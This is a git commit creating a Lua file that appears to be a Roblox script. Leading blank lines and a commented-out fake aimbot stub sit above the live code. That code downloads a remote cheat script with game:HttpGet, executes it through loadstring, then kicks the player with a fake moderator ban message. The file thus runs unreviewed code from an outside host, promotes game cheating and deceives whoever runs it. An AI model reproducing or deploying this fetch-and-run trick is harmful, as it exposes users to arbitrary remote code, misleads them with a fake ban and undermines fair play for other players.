56fb7c92b0a889933107ca1cb8a3e41ee53b5459
Jeremyrock326 <145816556+Jeremyrock326@users.noreply.github.com>
2024-06-20 17:16:45 -0400

    Create op.lua
    Signed-off-by: Jeremyrock326 <145816556+Jeremyrock326@users.noreply.github.com>

---
+++ op.lua
@@ -0,0 +1,40 @@
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+--[[
+
+
+    local aimbotTarget = nil
+
+    getrawmetable(nil)
+
+    function(nil)
+
+    --]]
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Exunys/AirHub/main/AirHub.lua"))()
+
+    game.Players.LocalPlayer:Kick("You've been banned by a moderator for : Anti-Exploit Ban You'll be unbanned in 2100000000 day(s)")
